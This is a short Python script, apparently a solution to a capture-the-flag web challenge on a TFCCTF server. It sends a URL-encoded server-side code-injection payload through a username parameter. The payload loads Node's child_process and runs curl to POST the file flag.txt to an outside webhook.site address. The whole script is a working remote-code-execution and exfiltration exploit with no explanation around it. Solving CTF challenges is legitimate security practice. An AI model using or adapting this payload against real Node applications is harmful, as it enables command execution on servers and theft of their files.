import requests

url = "http://challs.tfcctf.com:30931/result?username=" # Target URL
webhook = "https://webhook.site/d5de6476-d13e-41db-b66d-e27e414a7573" #change this with ur webhook
payload = """%23{function(){localLoad%3Dglobal.process.mainModule.constructor._load%3Bsh%3DlocalLoad(%22child_process%22).exec(%27curl+-X+POST+-d+%40flag.txt+""" + webhook.replace(":", "%3A").replace("/", "%2F") + """%27)}()}"""

full_url = url + payload
response = requests.get(full_url)
print("Success send flag to webhook!")
